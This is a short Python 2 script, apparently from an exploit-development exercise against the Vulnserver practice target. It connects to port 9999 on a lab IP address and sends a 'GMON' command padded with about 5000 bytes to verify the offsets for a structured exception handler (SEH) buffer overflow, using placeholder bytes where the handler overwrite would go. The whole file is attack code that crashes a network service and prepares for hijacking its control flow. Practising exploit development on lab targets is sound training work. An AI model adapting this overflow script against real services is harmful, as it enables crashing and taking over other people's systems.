#!/usr/bin/python

import socket
import struct

ip_addr = '192.168.199.130'
port = 9999

print "GMON Command - Verify Offsets\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    # Verify SEH offsets
    nseh = 'B'*4
    seh = 'C' * 4
    buffer = "GMON /.:/" + 'A'* 3495 + nseh + seh + 'E' * (5000-3495-4-4)

    bytes_sent = s.send(buffer)
    print "Sent %s bytes" % bytes_sent

finally:
    s.close()
